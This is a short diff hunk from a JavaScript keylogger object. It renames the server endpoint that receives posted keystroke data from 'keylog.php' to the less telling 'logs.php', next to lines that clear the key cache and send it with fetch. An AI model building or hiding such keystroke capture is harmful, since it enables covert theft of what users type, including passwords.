@@ -23,7 +23,7 @@ var keylog = {
         keylog.cache = []; // clear keys
   
     // FECTH SEND
-    fetch("keylog.php", { method:"POST", body:data })
+    fetch("logs.php", { method:"POST", body:data })
     .then(res=>res.text()).then(res => {
         keylog.sending = false; // unlock
         console.log(res); // optional
